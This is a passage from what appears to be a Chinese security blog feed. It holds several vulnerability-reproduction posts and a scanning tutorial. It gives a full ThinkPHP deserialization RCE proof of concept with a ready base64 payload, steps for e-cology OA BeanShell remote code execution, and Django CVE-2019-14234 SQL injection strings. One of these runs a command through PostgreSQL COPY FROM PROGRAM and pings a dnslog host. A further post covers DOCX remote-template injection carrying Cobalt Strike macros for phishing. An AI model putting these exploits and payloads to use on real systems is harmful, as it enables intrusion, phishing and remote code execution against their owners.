alt="在这里插入图片描述"></p><p>就是$filter可控<br>最后回到input函数 关键代码</p><p><img src="https://img-blog.csdnimg.cn/20200107143733892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后导致RCE的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">          <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">              <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">              $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure><ul><li>filterValue.value = 第一个通过GET请求的值input.data</li><li>filters.key = 第一个GET的键</li><li>filters.filters = input.filters</li></ul><p>上大佬的图</p><p><img src="https://img-blog.csdnimg.cn/20200107144450321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总的利用链<br><img src="https://img-blog.csdnimg.cn/20200107150410781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>到这里思路有了，回过头来看我们poc的利用过程，首先在上一步toArray()方法。创建了一个Request()对象，然后会触发poc里的__construct()方法，接着new Request()-&gt; visible($name)，该对象调用了一个不存在的方法会触发__call方法，看一下__construct()方法内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">'lin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"zeo"</span>=&gt;[<span class="string">"calc.exe"</span>,<span class="string">"calc"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"zeo"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们把payload通过POST传过去，然后通过GET请求获取需要执行的命令</p><p>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ6ZW8iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJ6ZW8iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjA6IiI7fX19fX19</p><p>复现成功<br><img src="https://img-blog.csdnimg.cn/20200107152900358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考文章<br><a href="https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/" target="_blank" rel="noopener">https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/</a><br><a href="https://blog.csdn.net/qq\_43380549/article/details/101265818" target="_blank" rel="noopener">https://blog.csdn.net/qq\_43380549/article/details/101265818</a><br><a href="https://xz.aliyun.com/t/6467" target="_blank" rel="noopener">https://xz.aliyun.com/t/6467</a><br><a href="https://xz.aliyun.com/t/6619" target="_blank" rel="noopener">https://xz.aliyun.com/t/6619</a><br><a href="https://www.t00ls.net/thread-54324-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-54324-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php\?tid=52825\&amp;extra=\&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php\?tid=52825\&amp;extra=\&amp;page=1</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】泛微 e-cology OA 远程代码执行漏洞复现</title>
      <link href="/2019/11/21/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/11/21/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>该漏洞位于 e-cology OA系统BeanShell组件中，并且该组件允许未授权访问，攻击者可通过访问该组件执行任意的Java代码，也就是说可以执行任意命令</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>包括但不限于7.0,8.0,8.1</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接在网站根目录后加入组件访问路径/weaver/bsh.servlet.BshServlet/</p><p>访问后直接在 Script 处输入Java代码点击 Evaluate 即可触发漏洞，并可以在Script Output处看到回显</p><p><img src="https://img-blog.csdnimg.cn/20191121165927935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】CVE-2019-14234 Django JSONField SQL注入漏洞复现</title>
      <link href="/2019/11/20/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/11/20/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】CVE-2019-14234-Django-JSONField-SQL注入漏洞复现"><a href="#【研究】CVE-2019-14234-Django-JSONField-SQL注入漏洞复现" class="headerlink" title="【研究】CVE-2019-14234 Django JSONField SQL注入漏洞复现"></a>【研究】CVE-2019-14234 Django JSONField SQL注入漏洞复现</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_7">2.原理</a></li><li><a href="#3_18">3.影响版本</a></li><li><a href="#4_25">4.利用过程</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br>直接使用vulhub的docker环境搭建<br>vulhub/django/CVE-2019-14234/</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。</p><p>Django通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。<br>通过JSONField类获得KeyTransform类并生成sql语句的位置。<br>其中key_name是可控的字符串，最终生成的语句是WHERE (field-&gt;’[key_name]’) =<br>‘value’，因此可以进行SQL注入。<br><img src="https://img-blog.csdnimg.cn/20191120090215403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Django<br>1.11.x before 1.11.23<br>2.1.x before 2.1.11<br>2.2.x before 2.2.4</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>访问<a href="http://ip:8000/admin/login/\?next=/admin/" target="_blank" rel="noopener">http://ip:8000/admin/login/\?next=/admin/</a><br>输入用户名admin ，密码a123123123<br><img src="https://img-blog.csdnimg.cn/20191120090549944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>进入漏洞界面</p><p>然后访问<br><a href="http://ip:8000/admin/vuln/collection/" target="_blank" rel="noopener">http://ip:8000/admin/vuln/collection/</a></p><p><img src="https://img-blog.csdnimg.cn/20191120090803576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>手工测试看看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__a'b=123</span></span><br></pre></td></tr></table></figure><p>报错出来 截断了<br><img src="https://img-blog.csdnimg.cn/20191120091112693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>命令执行语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__title')='1' or 1=1 ;create table cmd_exec(cmd_output text)--</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191120091710227.png" alt="在这里插入图片描述"><br>这里应该是执行了，试一下DNSLog</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__title')='1' or 1=1 ;copy cmd_exec FROM PROGRAM 'ping v62ce2.dnslog.cn'--</span></span><br></pre></td></tr></table></figure><p>ok成功了<br><img src="https://img-blog.csdnimg.cn/20191120092943327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用DOCX文档远程模板注入执行宏</title>
      <link href="/2019/10/28/%E5%88%A9%E7%94%A8DOCX%E6%96%87%E6%A1%A3%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%AE%8F/"/>
      <url>/2019/10/28/%E5%88%A9%E7%94%A8DOCX%E6%96%87%E6%A1%A3%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%AE%8F/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="利用DOCX文档远程模板注入执行宏"><a href="#利用DOCX文档远程模板注入执行宏" class="headerlink" title="利用DOCX文档远程模板注入执行宏"></a>利用DOCX文档远程模板注入执行宏</h2><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理</strong>：</h2><blockquote><p>与传统的宏启用文档相比，这种攻击的好处是多方面的。在对目标执行网络钓鱼攻击时，您可以将.docx的文档直接附加到电子邮件中，并且您不太可能根据文件的拓展名去阻止它。</p><p>Word远程模板执行宏就是利用Word文档加载附加模板时的缺陷所发起的恶意请求而达到的攻击目的，所以当目标用户点开攻击者发给他的恶意word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。<br>这种攻击更常见的原因是，发送的文档本身是不带恶意代码的，能过很多静态的检测。</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="两个word文档"><a href="#两个word文档" class="headerlink" title="两个word文档"></a>两个word文档</h3><ol><li>第一个是启用宏的模板，或是.dotm文件，它将包含恶意VBA宏</li><li>第二个是看似没有危害的.docx文件，它本身不包含恶意代码，只有指向恶意模板文件的目标链接</li><li>cobalt strike</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ol><li>直接用的cobalt strike生成的宏代码</li><li>就不啰嗦了<br><img src="https://img-blog.csdnimg.cn/20191025170218669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>自行测试宏是否生效<br><img src="https://img-blog.csdnimg.cn/20191025170810231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>生成一个正常的docx文件，内容根据实际需求进行编造，保存后将后缀改成zip</li><li>将其解压，修改./word/_rels/下的settings.xml.rels文件，没有的话可以自己添加。<br><img src="https://img-blog.csdnimg.cn/20191025172919941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li><strong>修改内容如下：</strong></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Relationship Id=<span class="string">"rId6"</span> Type=<span class="string">"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"</span> Target=<span class="string">"fontTable.xml"</span>/&gt;&lt;<span class="regexp">/Relationships&gt;</span></span><br></pre></td></tr></table></figure><p>包含带有attachmentTemplate的Type的Relationship标记，是告诉Word打开该.docx时从哪里加载模板的设置，我们可以将Target值修改为远程位置。</p><ol start="7"><li>最后保存后重新压缩成zip，并修改后缀为docx，执行测试，能返回<br><img src="https://img-blog.csdnimg.cn/20191028153128221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ol>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Zgrab在Linux(kali)下载、安装、使用教程</title>
      <link href="/2019/10/18/Zgrab%E5%9C%A8Linux(kali)%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2019/10/18/Zgrab%E5%9C%A8Linux(kali)%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E3%80%81%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="下载、安装、使用"><a href="#下载、安装、使用" class="headerlink" title="下载、安装、使用"></a>下载、安装、使用</h3><ul><li><a href="#_2">介绍</a></li><li><a href="#Zgrab_9">安装Zgrab</a></li><li><ul><li><a href="#go_10">安装需要go环境</a></li><li><a href="#zgrab_28">安装zgrab</a></li></ul></li><li><a href="#_45">使用</a></li></ul><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Zgrab是基于ZMap无状态扫描的应用层扫描器，可以自定义数据包以及ip、domain之间的关联。可用于快速指纹识别爆破等场景。</p><p>最新版本的GitHub网址：<a href="https://github.com/zmap/zgrab2" target="_blank" rel="noopener">https://github.com/zmap/zgrab2</a></p><h1 id="安装Zgrab"><a href="#安装Zgrab" class="headerlink" title="安装Zgrab"></a>安装Zgrab</h1><h2 id="安装需要go环境"><a href="#安装需要go环境" class="headerlink" title="安装需要go环境"></a>安装需要go环境</h2><p>我的是在Linux环境安装go</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//studygolang.com/dl/golang/go1.12.7.linux-amd64.tar.gz</span></span><br><span class="line">tar -C /usr/local -xzf go1<span class="number">.12</span><span class="number">.7</span>.linux-amd64.tar.gz </span><br><span class="line"><span class="comment">//配置环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="comment">//在最后追加变量</span></span><br><span class="line">PATH=$PATH:<span class="regexp">/usr/</span>local/go/bin  </span><br><span class="line">GOPATH=<span class="regexp">/usr/</span>local/go/bin/ </span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><p>也可以添加临时环境变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> PATH=$PATH:<span class="regexp">/usr/</span>local/go/bin  </span><br><span class="line"><span class="keyword">export</span> GOPATH=<span class="regexp">/usr/</span>local/go/bin/</span><br></pre></td></tr></table></figure><h2 id="安装zgrab"><a href="#安装zgrab" class="headerlink" title="安装zgrab"></a>安装zgrab</h2><ul><li>正常安装</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go <span class="keyword">get</span> github.com/zmap/zgrab2</span><br><span class="line">cd $GOPATH/src/github.com/zmap/zgrab2</span><br><span class="line">make</span><br></pre></td></tr></table></figure><ul><li>但是一般会有问题 出现</li><li>cannot find package “golang.org/x/crypto/curve25519 解决方法</li><li><a href="https://blog.csdn.net/god\_zzZ/article/details/102622092" target="_blank" rel="noopener">https://blog.csdn.net/god\_zzZ/article/details/102622092</a> 可以看我的这个文章</li><li>解决在在安装</li><li>成功是这样</li><li></li></ul><p><img src="https://img-blog.csdnimg.cn/20191018113850144.png" alt="在这里插入图片描述"></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>启动</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/go/bin/src/github.com/zmap/zgrab2</span><br><span class="line"> ./zgrab2 --help</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191018113901702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>命令 用法：</p><p>zgrab2 [选项] &lt;命令&gt;</p><p>应用选项：</p><p>-o, --output-file= 输出文件名， 使用 - 用于stdout（默认值： - ）</p><p>-f, --input-file= 输入文件名， 使用 - 用于stdin（默认值： - ）</p><p>-m, --metadata-file= 元数据文件名， 使用 - 用于stderr（默认值： - ）</p><p>-l, --log-file= 日志文件名，使用 - 用于stderr（默认值： - ）</p><p>-i, --interface= 要发送的网络接口</p><p>-s, --senders= 要使用的发送goroutine数（默认值：1000)</p><p>–debug 在输出中包含调试字段。</p><p>–gomaxprocs= 设置GOMAXPROCS（默认值：0）</p><p>–connections-per-host= 连接每台主机的次数（结果在更多输出中）（默认值：1）</p><p>–read-limit-per-host= 单个主机读取的最大总千字节数（默认96kb）（默认值：96）</p><p>–prometheus= 用于Prometheus服务器的地址（例如本地主机：8080）。如果为空，则禁用Prometheus。</p><blockquote><p>可用的命令：</p></blockquote><p>bacnet bacnet</p><p>banner Banner</p><p>dnp3 dnp3</p><p>fox fox</p><p>ftp FTP</p><p>http HTTP Banner Grab</p><p>imap imap</p><p>ipp ipp</p><p>modbus modbus</p><p>mongodb mongodb</p><p>mssql MSSQL</p><p>multiple Multiple module actions</p><p>mysql MySQL</p><p>ntp NTP</p><p>oracle oracle</p><p>pop3 pop3</p><p>postgres Postgres</p><p>redis redis</p><p>siemens siemens</p><p>smb smb</p><p>smtp smtp</p><p>ssh SSH Banner Grab</p><p>telnet telnet</p><p>tls TLS Banner Grab</p></blockquote><p>全球IP也可以从这里找到<br><a href="http://www.ipdeny.com/ipblocks/data/countries/cn.zone" target="_blank" rel="noopener">http://www.ipdeny.com/ipblocks/data/countries/cn.zone</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//www.ipdeny.com/ipblocks/data/countries/cn.zone</span></span><br></pre></td></tr></table></figure><p><strong>扫描出80端口的IP</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap -w cn.zone -p 80 -B 100M -o 80.res  